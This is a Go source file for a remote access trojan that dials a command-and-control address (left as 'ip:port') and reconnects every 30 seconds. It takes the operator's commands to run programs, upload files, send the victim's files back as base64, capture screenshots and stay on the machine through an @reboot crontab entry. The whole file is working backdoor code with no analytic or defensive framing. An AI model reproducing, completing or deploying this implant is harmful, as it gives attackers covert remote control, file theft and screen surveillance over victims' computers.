package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

const C2 string = "ip:port"

func main() {

	conn := connect_home()

	for {
		cmd, _ := bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if cmd == "q" || cmd == "quit" {
			send_response(conn, "Closing Connexion")
			conn.Close()
			break
		} else if cmd[0:2] == "cd" {
			if cmd == "cd" {
				cwd, err := os.Getwd()
				if err != nil {
					send_response(conn, err.Error())
				} else {
					send_response(conn, cwd)
				}
			} else {
				target_directory := strings.Split(cmd, " ")[1]
				if err := os.Chdir(target_directory); err != nil {
					send_response(conn, err.Error())
				} else {
					send_response(conn, target_directory)
				}
			}
		} else if strings.Contains(cmd, ":") {
			tmp := strings.Split(cmd, ":")
			if save_file(tmp[0], tmp[1]) {
				send_response(conn, "file uploaded succ")
			} else {
				send_response(conn, "error when uploading ur file")
			}
		} else if tmp := strings.Split(cmd, " "); tmp[0] == "download" {
			send_response(conn, get_file(tmp[1]))
		} else if cmd == "screenshot" {
			send_response(conn, take_screen_shot())
		} else if cmd == "persist" {
			send_response(conn, persist())
		} else {
			send_response(conn, command_execution(cmd))
		}
	}
}

func persist() string {
	file_name := "/tmp/persist"
	file, _ := os.Create(file_name)
	exec_path, _ := os.Executable()
	fmt.Fprintf(file, "@reboot %s\n", exec_path)
	_, err := exec.Command("/usr/bin/crontab", file_name).CombinedOutput()
	os.Remove(file_name)
	if err != nil {
		return "Error establishing Persistance"
	} else {
		return "Persistance has been establishing Succ"
	}
}

func connect_home() net.Conn {
	conn, err := net.Dial("tcp", C2)
	if err != nil {
		time.Sleep(time.Second * 30)
		return connect_home()
	}
	return conn
}

func send_response(conn net.Conn, msg string) {
	fmt.Fprintf(conn, "%s", msg)
}

func save_file(file_name string, b64_string string) bool {
	temp := b64_string[2 : len(b64_string)-1]
	content, _ := base64.StdEncoding.DecodeString(temp)
	if err := os.WriteFile(file_name, content, 0644); err != nil {
		return false
	}
	return true
}

func get_file(file string) string {
	if !file_exists(file) {
		return "File not Found"
	} else {
		return file + ":" + file_64(file)
	}
}

func file_exists(file string) bool {
	if _, err := os.Stat(file); err != nil {
		return false
	}
	return true
}

func file_64(file string) string {
	content, _ := os.ReadFile(file)
	return base64.StdEncoding.EncodeToString(content)
}

func take_screen_shot() string {
	bounds := screenshot.GetDisplayBounds(0)
	img, _ := screenshot.CaptureRect(bounds)
	file, _ := os.Create("wallpaper.png")
	defer file.Close()
	png.Encode(file, img)
	b64_string := file_64("wallpaper.png")
	os.Remove("wallpaper.png")
	return b64_string
}

func command_execution(cmd string) string {
	output, err := exec.Command(cmd).Output()
	if err != nil {
		return err.Error()
	} else {
		return string(output)
	}
}

